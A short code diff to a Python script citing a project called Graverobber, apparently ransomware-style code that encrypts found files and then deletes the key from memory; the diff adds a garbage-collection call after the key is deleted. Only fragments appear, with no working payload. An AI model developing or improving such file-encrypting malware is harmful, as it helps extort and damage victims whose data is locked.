@@ -6,6 +6,7 @@
 # Source: https://github.com/rf-peixoto/Graverobber
 # ========================================================================= #
 import os
+import gc
 import sys
 import base64
 import secrets
@@ -185,6 +186,7 @@ for f in tool.files_found:
         print(error)
 # All files encrypted? Delete key from memory:
 del node_key
+gc.collect()
 
 # ========================================================================= #
 # Decrypt function:
